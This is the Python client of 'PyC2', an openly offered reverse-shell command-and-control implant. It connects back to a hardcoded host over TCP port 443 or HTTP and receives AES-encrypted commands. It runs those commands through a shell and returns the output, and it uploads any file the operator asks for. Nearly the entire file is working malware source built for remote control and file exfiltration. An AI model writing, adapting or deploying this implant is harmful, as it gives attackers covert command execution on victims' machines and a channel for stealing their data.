#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
PyC2 - An encrypted TCP and HTTP shell (Client)

* AES Encryption
* Reverse Shell
* HTTP and TCP connections
* File Transfer
	
"""

import socket                    
import subprocess   
import requests     
import subprocess 
import time
import base64
import os
from Crypto.Cipher import AES

__version__='v0.1'
__description__='''\
  ___________________________________________________________
  
  PyC2 - An encrypted TCP and HTTP shell (Client)
  Author: Mattia Reggiani (info@mattiareggiani.com)
  Github: https://github.com/mattiareggiani/py2c
  ___________________________________________________________
'''

#
host = '192.168.0.4'
protocol = "TCP" #TCP | HTTP
counter = "H"*16
key = "H"*32
sleep = 1

def encrypt(message):
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return base64.b64encode(encrypto.encrypt(message))

def decrypt(message):
    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return  decrypto.decrypt(base64.b64decode(message)) 

	
def connectHTTP():
	while True:
		req = requests.get('http://' + host)      
		command = req.text                             
		command = decrypt(req.text)
		if 'exit' in command:
			break
		elif 'get' in command:
        
			get,path=command.split('*') 
        
			if os.path.exists(path): 
				url = 'http://' + host + '/transfer'
				f = open(path, 'rb')
				fs = encrypt(f.read())
				files = {'file': fs} 
				r = requests.post(url, files=files) 
            
			else:
				post_response = requests.post(url='http://' + host, data=encrypt('[-] Not able to find the file !') )
            
		else:
			CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			post_response = requests.post(url='http://' + host, data=encrypt(CMD.stdout.read()) )
			post_response = requests.post(url='http://' + host, data=encrypt(CMD.stderr.read()) )

		time.sleep(1)

def transfer(s,path):
	if os.path.exists(path):
		f = open(path, 'rb')
		packet = f.read(1024)
		while packet != '':
			packetE = encrypt(packet)
			s.send(packetE) 
			packet = f.read(1024)
		s.send(encrypt('DONE'))
		f.close()
	else:
		s.send(encrypt('Unable to find out the file'))

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, 443))
	while True: 
		command =  decrypt(s.recv(1024))

		if 'exit' in command:
		    s.close()
		    break 
		elif 'get' in command:            
		    get,path = command.split('*')
		    try:                         
			transfer(s,path)
		    except Exception,e:
			s.send ( str(e) )  
			pass
		else:
		    CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		    s.send( encrypt(CMD.stdout.read())  ) 
		    s.send( encrypt(CMD.stderr.read()) )

def main ():
	if protocol == "TCP":
		connect()
		
	elif protocol == "HTTP":
		connectHTTP()


if __name__ == "__main__":
	main()
